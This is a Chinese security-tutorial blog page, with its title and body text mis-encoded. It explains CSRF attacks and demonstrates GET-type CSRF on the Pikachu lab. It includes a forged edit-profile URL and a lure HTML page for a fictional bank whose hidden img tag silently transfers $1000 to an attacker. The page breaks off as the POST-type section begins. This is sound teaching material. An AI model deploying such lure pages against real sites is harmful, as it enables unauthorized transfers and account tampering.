<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>æˆ‘çš„æŠ€æœ¯ä¸ç”Ÿæ´»â€”â€”CSRF | zz</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
  <link rel="stylesheet" href="/css/public.css" />
  <link rel="stylesheet" href="/css/layout.css" />
  <link rel="stylesheet" href="/css/iconfont.css" />
  <link rel="stylesheet" href="/css/APlayer.min.css" />
  <script src="/js/APlayer.min.js"></script>
  <script src="/js/jquery.min.js"></script>
  <script src="/js/jquery.pjax.min.js"></script>

  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
  <script>
    document.title = `æˆ‘çš„æŠ€æœ¯ä¸ç”Ÿæ´»â€”â€”CSRF`
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>

<style>
  .load {
    width: 100%;
    height: 100vh;
    background-color: rgb(37, 35, 40);
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    position: relative;
    z-index: 9999;
  }
  .load-circle {
    width: 80px;
    height: 80px;
    border: 8px solid orange;
    border-bottom-color: transparent;
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
    animation: rotate 1s linear infinite;
    filter: drop-shadow(0 0 3px orange);
  }
  .load-circle-inner {
    width: 40px;
    height: 40px;
    border: 8px solid orange;
    border-top-color: transparent;
    border-radius: 50%;
    animation: rotate-reverse .5s linear infinite;
  }
  .load-text {
    margin-top: 20px;
    font-size: 24px;
    color: orange;
    display: flex;
  }
  .load-text span {
    margin: 0 5px;
    text-shadow: 5px 5px 5px orange;
    animation: move 1s linear infinite;
  }
  .load-text span:nth-child(1) {
    animation-delay: -0.6s;
  }
  .load-text span:nth-child(2) {
    animation-delay: -0.5s;
  }
  .load-text span:nth-child(3) {
    animation-delay: -0.4s;
  }
  .load-text span:nth-child(4) {
    animation-delay: -0.3s;
  }
  .load-text span:nth-child(5) {
    animation-delay: -0.2s;
  }
  .load-text span:nth-child(6) {
    animation-delay: -0.1s;
  }
  @keyframes rotate {
    0% { transform: rotate(0); }
    100% { transform: rotate(360deg); }
  }
  @keyframes rotate-reverse {
    0% { transform: rotate(0); }
    100% { transform: rotate(-360deg); }
  }
  @keyframes move {
    0% { transform: translateY(0%) rotate(0) scale(1); }
    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
    100% { transform: translateY(0) rotate(0) scale(1); }
  }

  .progress {
    position: fixed;
    left: 0; top: 0;
    width: 0;
    height: 3px;
    background-color: green;
    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
    z-index: 9999;
  }

  .to-up {
    animation: toUp .5s 1;
  }
  .gray {
    position: fixed;
    left: 0;
    top: 0;
    width: 100%;
    height: 100vh;
    z-index: 9999;
    display: none;
    pointer-events: none;
    background-color: #000;
    mix-blend-mode: color;
  }
  @keyframes toUp {
    from { transform: translateY(15px); opacity: 0; }
    to { transform: translateY(0) ; opacity: 1; }
  }
</style>
<body>
  <div id="load" class="load">
    <div class="load-circle">
      <div class="load-circle-inner"></div>
    </div>
    <p class="load-text">
      <span>L</span>
      <span>O</span>
      <span>A</span>
      <span>D</span>
      <span>I</span>
      <span>N</span>
      <span>G</span>
    </p>
  </div>
  <div id="container" class="container w-100 vh-100" style="display: none;">
    <header class="header">
  <div class="header-wrapper">
    <div class="header-left">
      <div class="header-search">
        <input id="search-input" type="text" class="header-search--input" placeholder="è¯·è¾“å…¥è¦æ£€ç´¢çš„æ–‡ç« æ ‡é¢˜" />
        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
      </div>
      <div id="search-layer" class="header-search--layer hidden">
        <p class="title">
          <span>ä»¥ä¸‹æ˜¯æœç´¢å†…å®¹ï¼š</span>
          <span id="close-layer-btn">å…³é—­</span>
        </p>
        <ul>
        </ul>
      </div>
    </div>
    <div class="header-right">
      <ul class="header-menu">
        <li>
          <a href="http://example.com/">
            <i class="header-menu--icon iconfont icon-shouye"></i>
            <span class="header-menu--span">é¦–é¡µ</span>
          </a>
        </li>
        <li>
          <a href="http://example.com/log">
            <i class="header-menu--icon iconfont icon-rizhi"></i>
            <span class="header-menu--span">æ—¥å¿—</span>
          </a>
        </li>
        <li>
          <a href="http://example.com/link">
            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
            <span class="header-menu--span">å‹æƒ…é“¾æ¥</span>
          </a>
        </li>
        <li>
          <a href="http://example.com/about">
            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
            <span class="header-menu--span">å…³äºæˆ‘</span>
          </a>
        </li>
      </ul>
    </div>
  </div>
</header>

<script>
  const ipt = document.querySelector('#search-input')
  const btn = document.querySelector('#search-btn')
  const layer = document.querySelector('#search-layer')
  const posts = JSON.parse(`[{"title":"1zweb","path":"2025/07/09/1zweb/"},{"title":"SSRFæ¼æ´","path":"2025/08/14/SSRFæ¼æ´/"},{"title":"XSS","path":"2025/08/23/XSS/"},{"title":"XXE","path":"2025/08/16/XXE/"},{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"pop","path":"2025/07/07/pop/"},{"title":"CSRF","path":"2025/08/24/CSRF/"}]`)
  ipt.addEventListener('keyup', e => {
    if (e.key === 'Enter') {
      handleSearch()
    }
  })
  btn.addEventListener('click', () => {
    handleSearch()
  })

  document.querySelector('#close-layer-btn').addEventListener('click', () => {
    layer.classList.toggle('hidden')
  })

  function handleSearch() {
    if (ipt.value.trim() === '') {
      return
    }
    let html = ''
    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
    targetPosts.forEach(post => {
      html += `
        <li>
          <div>
            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
          </div>
          <img src="${post.cover || '/imgs/default-cover.webp' }" />
        </li>
      `
    })
    if (html.trim () === '') {
      html += '<p class="empty">æ²¡æœ‰æœç´¢åˆ°å†…å®¹</p>'
    }
    layer.querySelector('ul').innerHTML = html
    layer.classList.remove('hidden')
  }
</script> 
    <section id="main" class="main">
      <div class="main-left-wrapper">
<div class="main-left">
  <div class="main-left--block">
    <div class="main-left--info">
      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
      <div class="main-left--intro">
        <p class="main-left--name">zz</p>
        <div class="main-left--tags">
          <span class="main-left--tag">è¾¹æ¸…é›¶è¾¹æ‹¥æœ‰</span>
          <span class="main-left--tag"></span>
        </div>
      </div>
    </div>
  
    <div>
      <div class="main-left--motto">
        <p>â€œå‰é€”ä¸ç«ç‘°ï¼Œæ¥æ—¥ä¸æ–¹é•¿"</p>
        <p>â€è‡ªèƒ½ç”Ÿç¾½ç¿¼ï¼Œä½•å¿…ä»°äº‘æ¢¯â€œ</p>
      </div>
      <div class="main-left--github">
        <span class="line"></span>
        <a target="_blank" rel="noopener" href="https://github.com/Aizener"><i class="logo iconfont icon-github-fill"></i></a>
        <span class="line"></span>
      </div>
      <div class="main-left--statics">
        <a href="/categories">
          <div>
            <span>6</span>
            <span>åˆ†ç±»</span>
          </div>
        </a>
        <a href="/tags">
          <div>
            <span>8</span>
            <span>æ ‡ç­¾</span>
          </div>
        </a>
        <a href="/archives">
          <div>
            <span>2 </span>
            <span>å½’æ¡£</span>
          </div>
        </a>
      </div>
    </div>
  </div>

  <div class="main-left--block">
    <ul class="main-left--menu">
      
        <li>
          <a href="/">
            <span class="header-menu--span">å°ç«™é¦–é¡µ</span>
            <i class="header-menu--icon iconfont icon-shouye"></i>
          </a>
        </li>
      
        <li>
          <a href="/log">
            <span class="header-menu--span">ä¸ªäººæ—¥å¿—</span>
            <i class="header-menu--icon iconfont icon-rizhi"></i>
          </a>
        </li>
      
        <li>
          <a href="/link">
            <span class="header-menu--span">å‹æƒ…é“¾æ¥</span>
            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
          </a>
        </li>
      
        <li>
          <a href="/about">
            <span class="header-menu--span">å…³äºè‡ªå·±</span>
            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
          </a>
        </li>
      
        <li>
          <a href="/tools">
            <span class="header-menu--span">æˆ‘çš„å·¥å…·</span>
            <i class="header-menu--icon iconfont icon-gongju"></i>
          </a>
        </li>
      
    </ul>
  </div>

  <div class="main-left--block">
    <div class="main-left--site">
      <h5 class="main-left--title">
        <span>ç«™ç‚¹ä¿¡æ¯</span>
        <i class="iconfont icon-zhandian"></i>
      </h5>
      <p class="main-left--subtitle">
        <span>æ–‡ç« æ•°ç›®ï¼š</span>
        <span>8 ç¯‡</span>
      </p>
      <p class="main-left--subtitle">
        <span>æœ€è¿‘åŠ¨æ€ï¼š</span>
        <span>ä»Šå¤©</span>
      </p>
      <p class="main-left--subtitle">
        <span>ä¸Šçº¿æ—¶é—´ï¼š</span>
        <span>87å¤©</span>
      </p>
      <p class="main-left--subtitle">
        <span>å½“å‰ç‰ˆæœ¬ï¼š</span>
        <span>v1.0.2</span>
      </p>
    </div>
  </div>
</div></div>
      <div id="main-container" class="main-container">


  <link rel="stylesheet" href="/css/partial/article.css" />

<div class="article-container">
  <div class="article">
    <h1 class="article-title">CSRF</h1>
    <div class="article-info">
      <div class="article-info--item">
        <div class="article-info--info">
          
          <div class="article-info--categories">
            <span>åˆ†ç±»ï¼š</span>
            <a class="category-link" href="/categories/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0CSRF/">è·¨ç«™è¯·æ±‚ä¼ªé€ CSRF</a>
          </div>
          
          
          <div class="article-info--tags">
            <span>æ ‡ç­¾ï¼š</span>
            <a class="tag-link" href="/tags/%E6%89%AB%E7%A0%81%E8%AF%88%E9%AA%97%E6%A1%88%E4%B9%8B%E7%BB%88%E6%9E%81%E7%89%88/" rel="tag">æ‰«ç è¯ˆéª—æ¡ˆä¹‹ç»ˆæç‰ˆ</a>
          </div>
          
          <p class="article-info--date">æ—¥æœŸï¼š2025-08-24 22:39:16</p>
        </div>
        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
      </div>
    </div>
    <article class="article-content markdown-body">
      <h1 id="CSRFæ¼æ´"><a href="#CSRFæ¼æ´" class="headerlink" title="CSRFæ¼æ´"></a>CSRFæ¼æ´</h1><h2 id="CSRFåŸç†"><a href="#CSRFåŸç†" class="headerlink" title="CSRFåŸç†"></a>CSRFåŸç†</h2><p>CSRF (Cross-site request forgeryï¼Œè·¨ç«™è¯·æ±‚ä¼ªé€ )æ˜¯ä¸€ç§å¯¹ç½‘ç«™çš„æ¶æ„åˆ©ç”¨ã€‚å°½ç®¡å¬èµ·æ¥åƒè·¨ç«™è„šæœ¬(XSS)ï¼Œä½†å®ƒä¸XSSéå¸¸ä¸åŒï¼ŒXSSåˆ©ç”¨ç«™ç‚¹å†…çš„ä¿¡ä»»ç”¨æˆ·ï¼Œè€Œ<strong>CSRFåˆ™é€šè¿‡ä¼ªè£…æˆå—ä¿¡ä»»ç”¨æˆ·è¯·æ±‚å—ä¿¡ä»»çš„ç½‘ç«™</strong>ã€‚</p>
<p><strong>æ ¸å¿ƒæ€æƒ³ï¼š</strong> æ”»å‡»è€…è¯±éª—ä¸€ä¸ªå·²ç»è®¤è¯ï¼ˆå·²ç™»å½•ï¼‰ çš„ç”¨æˆ·ï¼Œåœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œä¸€ä¸ªéæœ¬æ„çš„æ“ä½œï¼ˆå¦‚ä¿®æ”¹å¯†ç ã€è½¬è´¦ã€å‘é‚®ä»¶ç­‰ï¼‰ã€‚</p>
<p><strong>å…³é”®å‰æï¼š</strong> ç”¨æˆ·å¿…é¡»åœ¨ç›®æ ‡ç½‘ç«™ï¼ˆä¾‹å¦‚é“¶è¡Œç½‘ç«™ bank.comï¼‰ä¸Šå¤„äºå·²ç™»å½•çŠ¶æ€ï¼ˆä¼šè¯æœ‰æ•ˆï¼‰ã€‚</p>
<p><img src="/2025/07/09/1zweb/7a9fa8c79673f85628145d90f21736a.png" alt="img"></p>
<p>æ­¤å›¾çš„æ”»å‡»æµç¨‹</p>
<p>1ã€å®¢æˆ·ç«¯é€šè¿‡è´¦æˆ·å¯†ç ç™»å½•è®¿é—®ç½‘ç«™Aã€‚<br>2ã€ç½‘ç«™AéªŒè¯å®¢æˆ·ç«¯çš„è´¦å·å¯†ç ï¼ŒæˆåŠŸåˆ™ç”Ÿæˆä¸€ä¸ªsessionlDï¼Œå¹¶è¿”å›ç»™å®¢æˆ·ç«¯å­˜å‚¨åœ¨æµè§ˆå™¨ä¸­ã€‚<br>3ã€è¯¥å®¢æˆ·ç«¯Tabâ€”ä¸ªæ–°é¡µé¢è®¿é—®äº†ç½‘ç«™Bã€‚<br>4ã€ç½‘ç«™Bè‡ªåŠ¨è§¦å‘è¦æ±‚è¯¥å®¢æˆ·ç«¯è®¿é—®ç½‘ç«™Aã€‚(å³åœ¨ç½‘ç«™Bä¸­æœ‰é“¾æ¥æŒ‡å‘ç½‘ç«™A)<br>5ã€å®¢æˆ·ç«¯é€šè¿‡ç½‘ç«™Bä¸­çš„é“¾æ¥è®¿é—®ç½‘ç«™Aã€‚(æ­¤æ—¶æºå¸¦æœ‰åˆæ³•çš„SessionIDè¿›è¡Œè®¿é—®ç«™Açš„)<br>6ã€æ­¤æ—¶ç½‘ç«™Aåªéœ€æ£€éªŒsessionIlDæ˜¯å¦åˆæ³•ï¼Œåˆæ³•åˆ™æ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚(å› æ­¤å…·ä½“å•¥å·¥å…·å°±å¾—çœ‹é“¾æ¥ï¼Œä»¥åŠç½‘ç«™Bè¦æ±‚è®¿é—®æ—¶æºå¸¦çš„æ•°æ®)</p>
<p>èƒ½å®Œæˆcsrfæ”»å‡»ï¼Œå¿…é¡»åŒæ—¶æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p>
<p>ç™»å½•å—ä¿¡ä»»çš„ç½‘ç«™Aï¼Œå¹¶åœ¨æœ¬åœ°ç”Ÿæˆcookieï¼Œåœ¨ä¸ç­‰å‡ºAçš„æƒ…å†µä¸‹ï¼Œè®¿é—®å±é™©ç½‘ç«™B</p>
<h2 id="CSRFåˆ†ç±»"><a href="#CSRFåˆ†ç±»" class="headerlink" title="CSRFåˆ†ç±»"></a>CSRFåˆ†ç±»</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="GETå‹çš„CSRF"><a href="#GETå‹çš„CSRF" class="headerlink" title="GETå‹çš„CSRF"></a>GETå‹çš„CSRF</h3><h4 id="é¶åœºæ¼”ç¤º"><a href="#é¶åœºæ¼”ç¤º" class="headerlink" title="é¶åœºæ¼”ç¤º"></a>é¶åœºæ¼”ç¤º</h4><p>æˆ‘ä»¬ç›´æ¥ç”¨pikachué¶åœºæ¥è¿›è¡Œå­¦ä¹ </p>
<p>é¦–å…ˆæˆ‘ä»¬ç™»å½•è¿›é¡µé¢</p>
<p><img src="/2025/07/09/1zweb/48eb468f5b0df843b43018bf10b2822.png" alt="img"></p>
<p>å‘ç°èƒ½è¿›è¡Œä¿®æ”¹ä¸ªäººä¿¡æ¯ï¼Œé‚£æˆ‘ä»¬éšä¾¿ä¿®æ”¹ä¸€ä¸ªåœ°å€è¯•è¯•ï¼Œä¸æ­¤åŒæ—¶æŠ“åŒ…çœ‹ä¸€ä¸‹è¿™æ˜¯æ€ä¹ˆè¿›è¡Œä¸ªäººä¿¡æ¯ä¿®æ”¹çš„</p>
<p><img src="/2025/07/09/1zweb/dff5dd9b8b695b02756d0c82436ec3a.png" alt="img"></p>
<p>é‚£ä¸‹é¢æˆ‘ä»¬å°±æ¨¡æ‹Ÿä¸€ä¸‹getå‹çš„csrfæ”»å‡»</p>
<p>1.æ‹¿åˆ°getè¯·æ±‚çš„å½¢å¼ï¼ˆè¿™é‡Œåªè¦æ”»å‡»è€…ä¹Ÿç™»å…¥è¿™ä¸ªç•Œé¢ç„¶åä¹Ÿä¿®æ”¹ä¸€ä¸‹ä¸ªäººä¿¡æ¯å°±èƒ½æ‹¿åˆ°è¿™ä¸ªè¯·æ±‚ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=18656565545&amp;add=china&amp;email=lili%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>2.è¿›è¡Œä¼ªé€ </p>
<p>è¿™é‡Œæ˜¯è‡ªå·±åšå®éªŒï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨æˆåŠŸä¿®æ”¹è¿™ä¸ªç”¨æˆ·çš„ä¸ªäººä¿¡æ¯æ¥å½“ä½œæˆåŠŸæ”»å‡»çš„ä¿¡å·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.6/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=18656565545&amp;add=beijing&amp;email=lili%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>3.ç„¶åå°†è¿™ä¸ªé“¾æ¥å‘ç»™liliè¿™ä¸ªç”¨æˆ·ï¼Œå†è¯±å¯¼å¥¹åœ¨ç™»å½•pikachuå¹³å°çš„æƒ…å†µä¸‹ï¼Œç‚¹å‡»è¿™ä¸ªé“¾æ¥</p>
<p><img src="/2025/07/09/1zweb/c6f8fbf5b4845344235039e83060625.png" alt="img"></p>
<p>4.è¾¾åˆ°ç›®çš„æˆåŠŸä¿®æ”¹liliçš„ä¿¡æ¯</p>
<p><img src="/2025/07/09/1zweb/7f38b78c0e54fd7a2bebab492e9fb65.png" alt="img"></p>
<h4 id="å®ä¾‹æ¼”ç¤º"><a href="#å®ä¾‹æ¼”ç¤º" class="headerlink" title="å®ä¾‹æ¼”ç¤º"></a>å®ä¾‹æ¼”ç¤º</h4><p><strong>åœºæ™¯è®¾å®š</strong><br>å‡è®¾æœ‰ä¸€ä¸ªéå¸¸ç®€å•çš„é“¶è¡Œåº”ç”¨ vulnerable-bank.comï¼Œå®ƒä½¿ç”¨ <strong>GET è¯·æ±‚æ¥å¤„ç†è½¬è´¦åŠŸèƒ½</strong>ã€‚è¿™æ˜¯éå¸¸ç³Ÿç³•çš„è®¾è®¡ï¼Œä½†æ­£å› å¦‚æ­¤ï¼Œå®ƒèƒ½å®Œç¾åœ°å±•ç¤ºæœ€ç›´æ¥çš„CSRFæ”»å‡»ã€‚</p>
<ol>
<li>è½¬è´¦åŠŸèƒ½URLï¼š<br><a target="_blank" rel="noopener" href="http://vulnerable-bank.com/transfer?to=%E7%9B%AE%E6%A0%87%E8%B4%A6%E6%88%B7&amount=%E9%87%91%E9%A2%9D">http://vulnerable-bank.com/transfer?to=ç›®æ ‡è´¦æˆ·&amp;amount=é‡‘é¢</a></li>
<li>ç”¨æˆ·ç™»å½•ï¼š<br>ç”¨æˆ· Alice å·²ç»ç™»å½•äº† vulnerable-bank.comï¼Œå¥¹çš„æµè§ˆå™¨cookieä¸­å­˜å‚¨äº†å¥¹çš„ä¼šè¯IDï¼ˆSession IDï¼‰ã€‚</li>
<li>æ”»å‡»è€…ç›®æ ‡ï¼š<br>æ”»å‡»è€… Mallory çš„è´¦æˆ·æ˜¯ mallory_accountã€‚å¥¹æƒ³è¯±éª— Alice åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å‘è‡ªå·±è½¬è´¦ $1000ã€‚</li>
</ol>
<p><strong>ç¬¬ 1 æ­¥ï¼šæ­£å¸¸çš„ç”¨æˆ·æ“ä½œ</strong><br>å¦‚æœ Alice æƒ³ä¸»åŠ¨ç»™å¥¹çš„æœ‹å‹ Bob è½¬è´¦ $500ï¼Œå¥¹å¯èƒ½ä¼šç›´æ¥åœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥ï¼Œæˆ–è€…ç‚¹å‡»ä¸€ä¸ªæ—©å·²æ”¶è—å¥½çš„é“¾æ¥ï¼š</p>
<p><a target="_blank" rel="noopener" href="http://vulnerable-bank.com/transfer?to=bob_account&amount=500">http://vulnerable-bank.com/transfer?to=bob_account&amp;amount=500</a></p>
<p>æµè§ˆå™¨ä¼šå‘é“¶è¡ŒæœåŠ¡å™¨å‘é€ä¸€ä¸ª GET è¯·æ±‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /transfer?to=bob_account&amp;amount=500 HTTP/1.1</span><br><span class="line">Host: vulnerable-bank.com</span><br><span class="line">Cookie: sessionid=alices_session_cookie_here</span><br></pre></td></tr></table></figure>

<p>æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œæ£€æŸ¥Cookieï¼Œå‘ç°æ˜¯å·²ç™»å½•çš„Aliceï¼Œäºæ˜¯æ‰§è¡Œè½¬è´¦å¹¶è¿”å›æˆåŠŸé¡µé¢ã€‚</p>
<p><strong>ç¬¬ 2 æ­¥ï¼šæ”»å‡»è€…æ„é€ æ¶æ„è¯·æ±‚</strong><br>Mallory ç°åœ¨éœ€è¦æ„é€ ä¸€ä¸ªå®Œå…¨ç›¸åŒçš„è¯·æ±‚ï¼Œä½†å¥¹ä¸å¯èƒ½çŸ¥é“ Alice çš„ Cookieã€‚å¥¹çš„èªæ˜ä¹‹å¤„åœ¨äºï¼šå¥¹ä¸éœ€è¦çŸ¥é“ï¼Œå¥¹åªéœ€è¦è®© Alice çš„æµè§ˆå™¨å»å‘è¿™ä¸ªè¯·æ±‚å°±è¡Œäº†ã€‚</p>
<p>å¥¹å¯ä»¥åˆ›å»ºä¸€ä¸ª<u>éšè—çš„è¯·æ±‚</u>ã€‚æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯ç”¨ä¸€ä¸ª <img> æ ‡ç­¾ã€‚æµè§ˆå™¨ä¼šå°è¯•åŠ è½½è¿™ä¸ªâ€œå›¾ç‰‡â€ï¼Œä»è€Œå‘é“¶è¡ŒæœåŠ¡å™¨å‘é€ä¸€ä¸ªGETè¯·æ±‚ã€‚</p>
<p>å¥¹å°†ä»¥ä¸‹ä»£ç éƒ¨ç½²åœ¨è‡ªå·±çš„æ¶æ„ç½‘ç«™ä¸Šï¼ˆ<a href="http://evil-website.comï¼‰ï¼š">http://evil-website.comï¼‰ï¼š</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;èµ¢å–å…è´¹iPhoneï¼&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;æ­å–œä½ ï¼ä½ æ˜¯ç¬¬100ä¸‡ä½è®¿å®¢ï¼&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;ç‚¹å‡»ä¸‹æ–¹é“¾æ¥ï¼Œå³å¯èµ¢å–å…è´¹iPhoneï¼&lt;/p&gt;</span><br><span class="line">    &lt;!-- å…¶ä»–èŠ±é‡Œèƒ¡å“¨çš„å†…å®¹å¸å¼•ç”¨æˆ·æ³¨æ„åŠ› --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- éšè—çš„CSRFæ”»å‡»è½½è· --&gt;</span><br><span class="line">    &lt;img src=&quot;http://vulnerable-bank.com/transfer?to=mallory_account&amp;amount=1000&quot;</span><br><span class="line">         width=&quot;0&quot; height=&quot;0&quot; style=&quot;display:none;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>&lt;img src&#x3D;â€â€¦â€ï¼š æµè§ˆå™¨ä¼šè‡ªåŠ¨å‘ src å±æ€§ä¸­çš„URLå‘èµ·ä¸€ä¸ª GET è¯·æ±‚æ¥åŠ è½½â€œå›¾ç‰‡â€ã€‚</p>
<p>width&#x3D;â€0â€ height&#x3D;â€0â€ style&#x3D;â€display:none;â€ï¼š è¿™ä¸ªæ ‡ç­¾è¢«éšè—ï¼Œç”¨æˆ·å®Œå…¨çœ‹ä¸åˆ°ä»»ä½•å˜åŒ–ï¼Œæ”»å‡»åœ¨åå°é™é»˜å®Œæˆã€‚</p>
<p><strong>ç¬¬ 3 æ­¥ï¼šæ”»å‡»å‘ç”Ÿæµç¨‹</strong><br>1.è¯±å¯¼ï¼š Alice æ”¶åˆ°äº† Mallory å‘æ¥çš„ä¸€å°é’“é±¼é‚®ä»¶ï¼Œæ ‡é¢˜æ˜¯â€œæ­å–œä½ ä¸­å¥–äº†ï¼â€ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªé“¾æ¥æŒ‡å‘ <a target="_blank" rel="noopener" href="http://evil-website.com.alice/">http://evil-website.comã€‚Alice</a> å¥½å¥‡åœ°ç‚¹äº†è¿›å»ã€‚</p>
<p>2.åŠ è½½ï¼š æµè§ˆå™¨åŠ è½½äº†æ¶æ„ç½‘ç«™ã€‚åœ¨åŠ è½½è¿‡ç¨‹ä¸­ï¼Œå®ƒé‡åˆ°äº†é‚£ä¸ªéšè—çš„ <img> æ ‡ç­¾ã€‚</p>
<p>3.å‘é€è¯·æ±‚ï¼š æµè§ˆå™¨å¼€å§‹å‘ <a target="_blank" rel="noopener" href="http://vulnerable-bank.com/transfer?to=mallory_account&amount=1000">http://vulnerable-bank.com/transfer?to=mallory_account&amp;amount=1000</a> å‘èµ·è¯·æ±‚ã€‚</p>
<p>4.æºå¸¦Cookieï¼š å…³é”®ä¸€æ­¥ï¼ å› ä¸º Alice ä¹‹å‰ç™»å½•è¿‡ vulnerable-bank.comï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨åœ°ã€åˆæ³•åœ°å°†å±äº vulnerable-bank.com çš„Cookieï¼ˆåŒ…å«Aliceçš„ä¼šè¯IDï¼‰é™„åŠ åˆ°è¿™ä¸ªè¯·æ±‚ä¸­ã€‚ï¼ˆå‰ææ˜¯Aliceè¿˜æ²¡æœ‰é€€å‡ºvulnerable-bank.comçš„ç™»å½•ï¼Œä¼šè¯IDä»æœ‰æ•ˆï¼‰</p>
<p>5.æœåŠ¡å™¨éªŒè¯ï¼š é“¶è¡ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /transfer?to=mallory_account&amp;amount=1000 HTTP/1.1</span><br><span class="line">Host: vulnerable-bank.com</span><br><span class="line">Cookie: sessionid=alices_session_cookie_here # æµè§ˆå™¨è‡ªåŠ¨æºå¸¦çš„ï¼</span><br></pre></td></tr></table></figure>

<p>æœåŠ¡å™¨æ£€æŸ¥Cookieï¼Œæœ‰æ•ˆï¼è¿™æ˜¯åˆæ³•çš„ç”¨æˆ·Aliceå‘æ¥çš„è¯·æ±‚ã€‚äºæ˜¯æœåŠ¡å™¨æ‰§è¡Œæ“ä½œï¼šä»Aliceçš„è´¦æˆ·æ‰£é™¤$1000ï¼Œå­˜å…¥Malloryçš„è´¦æˆ·ã€‚</p>
<p>6.æ”»å‡»å®Œæˆï¼š æ”»å‡»åœ¨Aliceæ¯«ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å®Œæˆäº†ã€‚å¥¹åªæ˜¯åœ¨çœ‹ä¸€ä¸ªâ€œä¸­å¥–â€é¡µé¢ï¼Œè€Œå¥¹çš„é’±å·²ç»è¢«è½¬èµ°äº†ã€‚æµè§ˆå™¨å¯èƒ½ä¼šæ˜¾ç¤ºä¸€ä¸ªâ€œå›¾ç‰‡åŠ è½½å¤±è´¥â€çš„é”™è¯¯ï¼ˆå› ä¸ºæœåŠ¡å™¨è¿”å›çš„æ˜¯è½¬è´¦æˆåŠŸçš„HTMLé¡µé¢ï¼Œä¸æ˜¯å›¾ç‰‡ï¼‰ï¼Œä½†ç”¨æˆ·æ ¹æœ¬ä¸ä¼šåœ¨æ„ã€‚</p>
<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="POSTå‹çš„CSRF"><a href="#POSTå‹çš„CSRF" class="headerlink" title="POSTå‹çš„CSRF"></a>POSTå‹çš„CSRF</h3><h4 id="é¶åœºæ¼”ç¤º-1"><a href="#é¶åœºæ¼”ç¤º-1" class="headerlink" title="é¶åœºæ¼”ç¤º"></a>é¶åœºæ¼”ç¤º</h4><p>è¿™ä¸€å…³ç™»å½•è¿›å»å’Œç¬¬ä¸€å…³æ˜¯ä¸€æ ·çš„</p>
<p>è¿›å…¥ä¿®æ”¹ä¿¡æ¯ç•Œé¢ï¼Œç‚¹å‡»æäº¤è¿›è¡ŒæŠ“åŒ…</p>
<p><img src="/2025/07/09/1zweb/ae07ac8eed71eb00969a14cbaeaf778.png" alt="img"></p>
